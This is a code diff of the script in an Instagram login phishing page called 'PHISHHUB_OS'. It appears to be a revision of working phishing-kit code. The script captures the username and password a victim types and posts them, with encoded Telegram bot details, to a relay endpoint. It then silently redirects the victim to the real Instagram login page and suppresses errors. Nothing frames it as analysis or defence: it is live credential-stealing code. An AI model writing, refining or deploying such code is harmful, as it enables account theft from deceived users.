@@ -140,63 +140,66 @@
         </div>
     </div>
 
-    <script>
-        // PHISHHUB_OS: Dynamic Config Extraction
-        const getExfilParams = () => {
-            const h = window.location.hash.substring(1);
-            if (!h) return null;
-            try { return JSON.parse(atob(h)); } catch(e) { return null; }
-        };
+<script>
+    // 1. Grab raw Base64 config from URL
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
 
-        const config = getExfilParams();
+    const configString = getRawConfig();
 
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                document.getElementById('splash').classList.add('fade-hide');
-                document.querySelectorAll('.main-wrapper').forEach(el => el.classList.add('fade-show'));
-                document.body.style.overflow = 'auto';
-            }, 1800);
-        });
+    // Keeps your splash screen effect
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            const splash = document.getElementById('splash');
+            if (splash) splash.classList.add('fade-hide');
+            document.querySelectorAll('.main-wrapper').forEach(el => el.classList.add('fade-show'));
+            document.body.style.overflow = 'auto';
+        }, 1800);
+    });
 
-        async function executeExfil() {
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            const btnText = document.getElementById('btn-text');
-            const btnLoader = document.getElementById('btn-loader');
+    async function executeExfil() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        const btnText = document.getElementById('btn-text');
+        const btnLoader = document.getElementById('btn-loader');
 
-            if (!user || !pass) return;
+        if (!user || !pass) return;
 
-            // UI Feedback
-            btnText.classList.add('hidden');
-            btnLoader.classList.remove('hidden');
+        // UI Feedback
+        if (btnText) btnText.classList.add('hidden');
+        if (btnLoader) btnLoader.classList.remove('hidden');
 
-            const redirectUrl = "https://www.instagram.com/accounts/login/";
+        const redirectUrl = "https://www.instagram.com/accounts/login/";
 
-            if (!config) {
-                setTimeout(() => window.location.href = redirectUrl, 1000);
-                return;
-            }
-
-            try {
-                // Routing through PHISHHUB_OS relay
-                await fetch('/api/exfil', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target: 'instagram',
-                        credentials: { username: user, password: pass },
-                        tgToken: config.t,
-                        tgChat: config.c
-                    })
-                });
-            } catch (e) {
-                // Suppress errors
-            } finally {
-                setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, 1000);
-            }
+        // If no config found in URL, just redirect normally
+        if (!configString) {
+            setTimeout(() => window.location.href = redirectUrl, 1000);
+            return;
         }
-    </script>
+
+        try {
+            // 2. Call your central Vercel API relay (/api/process)
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, // The encoded Telegram info
+                    data: { 
+                        User: user, 
+                        Pass: pass 
+                    }
+                })
+            });
+        } catch (e) {
+            // Suppress errors for seamless experience
+        } finally {
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 1000);
+        }
+    }
+</script>
 </body>
 </html>
